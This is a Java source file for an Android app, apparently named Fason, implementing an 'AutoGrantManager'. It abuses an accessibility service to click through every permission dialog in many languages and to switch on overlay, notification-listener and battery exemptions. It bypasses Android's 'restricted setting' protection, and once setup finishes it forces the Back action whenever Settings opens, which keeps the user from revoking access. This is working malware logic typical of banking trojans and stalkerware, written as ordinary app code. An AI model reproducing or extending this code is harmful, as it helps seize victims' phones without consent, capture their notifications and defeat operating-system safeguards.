package com.fason.app.core.permissions;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.app.ActivityCompat;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import java.lang.ref.WeakReference;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * AutoGrantManager v4 — fully event-driven permission engine.
 *
 * Design principle: zero sleep loops in the hot path.
 * Every grant is triggered by an AccessibilityEvent.
 *
 * Runtime permissions:
 *   requestPermissions() → dialog appears → onAccessibilityEvent fires →
 *   immediate click on event thread → 250ms later → requestPermissions() for
 *   next group → repeat. One group every ~500ms. All groups done in ~3s.
 *
 * Special permissions (overlay, notification listener, battery):
 *   Open Settings intent → onAccessibilityEvent fires on settings page load →
 *   click toggle/button → verify → open next. Each takes ~1.5s.
 *
 * Restricted Setting bypass (Samsung/stock Android 12+):
 *   Detect "Controlled by restricted setting" or greyed service →
 *   click overflow menu → click "Allow restricted setting" → confirm →
 *   navigate back → re-open accessibility settings → enable toggle.
 *
 * Total target: <15 seconds from accessibility granted to all permissions done.
 */
public final class AutoGrantManager {

    private static final String TAG = "AGM";

    // ─── OEM permission controller packages ─────────────────────────────────────
    private static final String[] PERM_PKGS = {
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.huawei.systemmanager",
        "com.coloros.safecenter",
        "com.vivo.permissionmanager",
        "com.oneplus.security",
        "com.asus.permissioncontroller",
        "com.transsion.security",
        "com.lge.qpair",          // LG
        "com.sec.android.app.launcher", // some Samsung builds serve perm dialogs here
    };

    private static final String[] SETTINGS_PKGS = {
        "com.android.settings",
        "com.samsung.android.settings",
        "com.miui.securitycenter",
        "com.huawei.systemmanager",
        "com.coloros.settings",
        "com.vivo.permissionmanager",
    };

    // ─── HIGHEST PRIORITY: "Allow all the time" equivalents ─────────────────────
    // These appear in battery/location dialogs. findAccessibilityNodeInfosByText()
    // does substring matching, so short unique fragments work best.
    private static final String[] TIER1 = {
        "allow all the time",
        "always allow",
        "allow in background",
        // Chinese
        "始终允许", "总是允许", "一直允许",
        // Korean
        "항상 허용",
        // Others
        "toujours autoriser", "immer zulassen", "siempre permitir",
    };

    // ─── HIGH PRIORITY: standard allow ──────────────────────────────────────────
    // CRITICAL: Samsung OneUI permission buttons say exactly "While using the app"
    // and "Only this time" — no "allow" prefix. These MUST be here.
    private static final String[] TIER2 = {
        // ── Samsung OneUI (most common) ──────────────────────────────────────────
        "while using the app",      // Samsung Camera dialog exact text
        "while using",              // Short variant
        "only while using",         // AOSP variant with "only"
        "allow only while using",   // Full AOSP text
        "only this time",           // Samsung second choice (better than deny)
        // ── Standard ────────────────────────────────────────────────────────────
        "allow",
        "permit",
        "accept",
        "agree",
        "ok",
        "yes",
        "enable",
        "turn on",
        "activate",
        // ── Special permission settings ──────────────────────────────────────────
        "allow restricted setting",
        "allow restricted settings",
        "allow access",
        "give access",
        // ── Device admin ─────────────────────────────────────────────────────────
        "activate device admin",
        "activate device administrator",
        // ── Chinese ──────────────────────────────────────────────────────────────
        "允许", "同意", "开启", "授权", "确定", "是",
        "仅在使用该应用期间",       // "only while using app" in Chinese
        // ── Korean ───────────────────────────────────────────────────────────────
        "허용", "앱 사용 중에만 허용",
        // ── Others ───────────────────────────────────────────────────────────────
        "autoriser", "zulassen", "permitir", "aceptar",
        "разрешить", "принять",
        "consenti",
    };

    // ─── Restricted setting trigger texts ───────────────────────────────────────
    private static final String[] RESTRICTED_TEXTS = {
        "controlled by restricted setting",
        "restricted setting",
        "this setting is not available",
    };

    // ─── Singleton ───────────────────────────────────────────────────────────────
    private static volatile AutoGrantManager instance;
    public static AutoGrantManager getInstance() {
        if (instance == null) synchronized (AutoGrantManager.class) {
            if (instance == null) instance = new AutoGrantManager();
        }
        return instance;
    }

    // ─── State ───────────────────────────────────────────────────────────────────
    private final Handler        main         = new Handler(Looper.getMainLooper());
    private final ExecutorService pool        = Executors.newCachedThreadPool();
    private final AtomicBoolean  armed        = new AtomicBoolean(false);
    private final AtomicBoolean  busy         = new AtomicBoolean(false);
    private volatile boolean     blockSettings = false;
    private volatile boolean     inSetup      = true;
    private volatile String      phase        = null; // "RUNTIME", "OVERLAY", "NOTIF", "BATTERY", "ADMIN"
    private volatile WeakReference<android.app.Activity> actRef;
    private volatile Listener    listener;

    public interface Listener {
        void onPermissionGranted(String perm);
        void onGateComplete(String label);
        void onSequenceComplete();
        void onProgress(int granted, int total);
    }
    public void setListener(Listener l) { this.listener = l; }
    public boolean isSetupMode() { return inSetup; }

    // ─── Entry points ─────────────────────────────────────────────────────────────

    /** Step 1 — called before opening Accessibility Settings. */
    public void armForAccessibility(android.app.Activity act) {
        actRef   = new WeakReference<>(act);
        inSetup  = true;
        phase    = "A11Y";
        armed.set(true);
        blockSettings = false;
        Log.i(TAG, "armed for accessibility");
    }

    /** Step 2 — called immediately after accessibility is confirmed enabled. */
    public void startRuntimeGrants(android.app.Activity act) {
        actRef  = new WeakReference<>(act);
        phase   = "RUNTIME";
        armed.set(true);
        // Fire first group immediately — no delay
        requestNextGroup();
    }

    /** Enable settings block after all setup is complete. */
    public void enableSettingsBlock() {
        blockSettings = true;
        inSetup       = false;
    }

    // ─── Core event handler ───────────────────────────────────────────────────────

    /**
     * Called from FasonAccessibilityService.onAccessibilityEvent() — on the event thread.
     * Executes the click synchronously with zero additional delay.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        // ── Settings blocker (post-setup) ────────────────────────────────────────
        if (blockSettings && isSettingsPkg(pkg)) {
            FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
            if (svc != null) svc.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
            return;
        }

        if (!armed.get()) return;
        if (!busy.compareAndSet(false, true)) return;

        try {
            FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
            if (svc == null) return;
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) return;
            try {
                handleWindow(root, pkg);
            } finally {
                recycleNode(root);
            }
        } finally {
            busy.set(false);
        }
    }

    // ─── Window dispatch ──────────────────────────────────────────────────────────

    private void handleWindow(AccessibilityNodeInfo root, String pkg) {
        // ── Permission controller dialog ──────────────────────────────────────────
        if (isPermPkg(pkg)) {
            if (click(root)) {
                Log.d(TAG, "CLICKED permission dialog");
                // Fire next group after dialog dismiss animation (~250ms)
                main.postDelayed(this::requestNextGroup, 250);
            }
            return;
        }

        // ── Settings pages ────────────────────────────────────────────────────────
        if (isSettingsPkg(pkg)) {
            // Restricted Setting bypass takes priority
            if (checkRestricted(root)) return;
            // Try allow button or toggle
            if (click(root)) {
                Log.d(TAG, "CLICKED in settings phase=" + phase);
                main.postDelayed(this::onSettingsClicked, 400);
            }
        }
    }

    // ─── Click engine ─────────────────────────────────────────────────────────────

    /**
     * Tries TIER1 first (Allow all the time), then TIER2 (While using the app, Allow…).
     * Returns true if something was clicked.
     */
    private boolean click(AccessibilityNodeInfo root) {
        for (String t : TIER1) {
            if (clickText(root, t)) return true;
        }
        for (String t : TIER2) {
            if (clickText(root, t)) return true;
        }
        // Toggle fallback (for settings pages with on/off switches)
        return clickOffToggle(root);
    }

    /** findAccessibilityNodeInfosByText is a substring/contains search. */
    private boolean clickText(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null || nodes.isEmpty()) return false;
        try {
            for (AccessibilityNodeInfo n : nodes) {
                if (n == null) continue;
                String txt = n.getText() != null ? n.getText().toString().toLowerCase() : "";
                String dsc = n.getContentDescription() != null
                    ? n.getContentDescription().toString().toLowerCase() : "";
                if (!txt.contains(text.toLowerCase()) && !dsc.contains(text.toLowerCase())) continue;
                // Walk up to find clickable ancestor (max 3 levels)
                AccessibilityNodeInfo target = clickableAncestor(n, 3);
                if (target != null && target.isVisibleToUser()) {
                    boolean ok = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (ok) { recycleList(nodes); return true; }
                }
            }
        } finally {
            recycleList(nodes);
        }
        return false;
    }

    /** Scans for an off Switch/CheckBox/ToggleButton and clicks it. */
    private boolean clickOffToggle(AccessibilityNodeInfo node) {
        if (node == null) return false;
        // Try known switch IDs first (fastest)
        String[] ids = {
            "com.android.settings:id/switch_widget",
            "android:id/switch_widget",
            "com.samsung.android.settings:id/switch_widget",
            "com.android.settings:id/switchWidget",
        };
        for (String id : ids) {
            List<AccessibilityNodeInfo> sw = node.findAccessibilityNodeInfosByViewId(id);
            if (sw != null) {
                for (AccessibilityNodeInfo n : sw) {
                    if (n != null && n.isClickable() && !n.isChecked() && n.isVisibleToUser()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        recycleList(sw); return true;
                    }
                }
                recycleList(sw);
            }
        }
        // Tree scan fallback
        return scanToggle(node);
    }

    private boolean scanToggle(AccessibilityNodeInfo n) {
        if (n == null) return false;
        String cls = n.getClassName() != null ? n.getClassName().toString() : "";
        if ((cls.contains("Switch") || cls.contains("ToggleButton") || cls.contains("CheckBox"))
            && n.isClickable() && !n.isChecked() && n.isVisibleToUser()) {
            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo c = n.getChild(i);
            if (c != null) { if (scanToggle(c)) { c.recycle(); return true; } c.recycle(); }
        }
        return false;
    }

    private AccessibilityNodeInfo clickableAncestor(AccessibilityNodeInfo n, int maxLevels) {
        AccessibilityNodeInfo cur = n;
        for (int i = 0; i <= maxLevels; i++) {
            if (cur == null) return null;
            if (cur.isClickable()) return cur;
            AccessibilityNodeInfo parent = cur.getParent();
            cur = parent;
        }
        return null;
    }

    // ─── Restricted Setting bypass ────────────────────────────────────────────────

    private boolean checkRestricted(AccessibilityNodeInfo root) {
        boolean found = false;
        for (String t : RESTRICTED_TEXTS) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            if (nodes != null && !nodes.isEmpty()) { recycleList(nodes); found = true; break; }
        }
        if (!found) return false;

        Log.i(TAG, "Restricted Setting — starting bypass");

        // 1. Try direct "Allow restricted setting" button on the current screen
        if (clickText(root, "allow restricted setting")
            || clickText(root, "allow restricted settings")) {
            Log.d(TAG, "Direct allow button hit");
            main.postDelayed(this::afterRestrictedCleared, 600);
            return true;
        }

        // 2. Overflow / gear icon (Samsung shows this on the detail page)
        if (clickDesc(root, "More options") || clickDesc(root, "More")
            || clickDesc(root, "Menu")      || clickDesc(root, "Settings")) {
            Log.d(TAG, "Overflow clicked — waiting for menu");
            // The next event will carry the "Allow restricted setting" menu item
            return true;
        }

        // 3. Tap the greyed accessibility item itself to enter the detail page
        String appLabel = getAppLabel();
        if (clickText(root, appLabel) || clickText(root, "system manager")) {
            Log.d(TAG, "Greyed item tapped");
            return true;
        }

        // 4. Navigate to App Info where the option appears in the overflow
        main.postDelayed(() -> {
            try {
                Context ctx = FasonApp.getContext();
                Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }, 100);
        return true;
    }

    private boolean clickDesc(AccessibilityNodeInfo root, String desc) {
        if (root == null) return false;
        CharSequence d = root.getContentDescription();
        if (d != null && d.toString().equalsIgnoreCase(desc) && root.isClickable()) {
            root.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true;
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo c = root.getChild(i);
            if (c != null) { if (clickDesc(c, desc)) { c.recycle(); return true; } c.recycle(); }
        }
        return false;
    }

    private void afterRestrictedCleared() {
        FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
        if (svc != null) {
            svc.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
            main.postDelayed(() -> {
                try {
                    Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    FasonApp.getContext().startActivity(i);
                } catch (Exception ignored) {}
            }, 500);
        }
    }

    // ─── Permission group flow ────────────────────────────────────────────────────

    private void requestNextGroup() {
        Context ctx = FasonApp.getContext();
        String[] group = PermissionManager.getNextDeniedGroup(ctx);
        if (group == null) {
            // All runtime perms granted
            Log.i(TAG, "All runtime permissions granted");
            post(() -> { if (listener != null) listener.onGateComplete("Permissions"); });
            main.postDelayed(this::startSpecialGrants, 200);
            return;
        }
        android.app.Activity act = actRef != null ? actRef.get() : null;
        if (act != null && !act.isFinishing() && !act.isDestroyed()) {
            main.post(() -> ActivityCompat.requestPermissions(act, group,
                com.fason.app.ui.PermissionSetupController.PERM_REQ));
        }
        // Watchdog: if dialog doesn't appear in 3s, retry the group
        main.postDelayed(this::watchdogCheck, 3000);
    }

    private void watchdogCheck() {
        if (!"RUNTIME".equals(phase)) return;
        Context ctx = FasonApp.getContext();
        if (PermissionManager.getNextDeniedGroup(ctx) != null) {
            Log.w(TAG, "Watchdog: dialog didn't appear or wasn't clicked — retrying");
            requestNextGroup();
        }
    }

    // ─── Special permissions ──────────────────────────────────────────────────────

    private void startSpecialGrants() {
        Context ctx = FasonApp.getContext();

        if (!PermissionManager.hasOverlayPermission(ctx)) {
            phase = "OVERLAY";
            openSettingsIntent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                ctx.getPackageName());
            // Poll with short intervals — event-driven click is the primary path,
            // poll is just a fallback verifier
            pool.execute(() -> pollUntil(
                () -> PermissionManager.hasOverlayPermission(FasonApp.getContext()),
                "Overlay", 8_000, this::onOverlayDone));
        } else {
            onOverlayDone();
        }
    }

    private void onOverlayDone() {
        post(() -> { if (listener != null) listener.onGateComplete("Overlay"); });
        Context ctx = FasonApp.getContext();
        if (!PermissionManager.hasNotifListenerAccess(ctx)) {
            phase = "NOTIF";
            main.post(() -> openSettingsIntent(
                Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS, null));
            pool.execute(() -> pollUntil(
                () -> PermissionManager.hasNotifListenerAccess(FasonApp.getContext()),
                "Notifications", 8_000, this::onNotifDone));
        } else {
            onNotifDone();
        }
    }

    private void onNotifDone() {
        post(() -> { if (listener != null) listener.onGateComplete("Notifications"); });
        Context ctx = FasonApp.getContext();
        if (!PermissionManager.hasBatteryExemption(ctx)) {
            phase = "BATTERY";
            main.post(() -> openSettingsIntent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                ctx.getPackageName()));
            pool.execute(() -> pollUntil(
                () -> PermissionManager.hasBatteryExemption(FasonApp.getContext()),
                "Battery", 6_000, this::onAllDone));
        } else {
            onAllDone();
        }
    }

    private void onAllDone() {
        post(() -> { if (listener != null) listener.onGateComplete("Battery"); });
        phase = null;
        armed.set(false);
        post(() -> { if (listener != null) listener.onSequenceComplete(); });
        Log.i(TAG, "All grants complete");
    }

    private void onSettingsClicked() {
        Context ctx = FasonApp.getContext();
        boolean done = false;
        switch (phase != null ? phase : "") {
            case "A11Y":
                done = PermissionManager.hasAccessibilityAccess(ctx); break;
            case "OVERLAY":
                done = PermissionManager.hasOverlayPermission(ctx); break;
            case "NOTIF":
                done = PermissionManager.hasNotifListenerAccess(ctx); break;
            case "BATTERY":
                done = PermissionManager.hasBatteryExemption(ctx); break;
        }
        if (done) {
            switch (phase != null ? phase : "") {
                case "A11Y":    post(() -> { if (listener != null) listener.onGateComplete("Accessibility"); }); break;
                case "OVERLAY": onOverlayDone(); break;
                case "NOTIF":   onNotifDone();   break;
                case "BATTERY": onAllDone();      break;
            }
        }
    }

    /**
     * Polls a condition with 200ms intervals up to timeoutMs.
     * Primary grant is event-driven; this is a fallback verifier.
     */
    private void pollUntil(BoolCheck check, String label, long timeoutMs, Runnable onDone) {
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline) {
            try { Thread.sleep(200); } catch (InterruptedException ignored) { return; }
            if (check.get()) { onDone.run(); return; }
        }
        Log.w(TAG, label + " timed out — continuing");
        onDone.run(); // proceed regardless
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────────

    private void openSettingsIntent(String action, String pkg) {
        try {
            Intent i = new Intent(action);
            if (pkg != null) i.setData(Uri.parse("package:" + pkg));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            FasonApp.getContext().startActivity(i);
        } catch (Exception e) { Log.w(TAG, "Intent failed: " + action); }
    }

    private boolean isPermPkg(String p) {
        for (String s : PERM_PKGS) if (s.equals(p)) return true;
        return false;
    }

    private boolean isSettingsPkg(String p) {
        for (String s : SETTINGS_PKGS) if (p.equals(s) || p.startsWith(s)) return true;
        return false;
    }

    private String getAppLabel() {
        try { return FasonApp.getContext().getApplicationInfo()
            .loadLabel(FasonApp.getContext().getPackageManager())
            .toString().toLowerCase(); }
        catch (Exception e) { return "system manager"; }
    }

    private void post(Runnable r) { main.post(r); }

    private static void recycleList(List<AccessibilityNodeInfo> list) {
        if (list == null) return;
        for (AccessibilityNodeInfo n : list) try { if (n != null) n.recycle(); } catch (Exception ignored) {}
    }

    private static void recycleNode(AccessibilityNodeInfo n) {
        try { if (n != null) n.recycle(); } catch (Exception ignored) {}
    }

    @FunctionalInterface interface BoolCheck { boolean get(); }
}
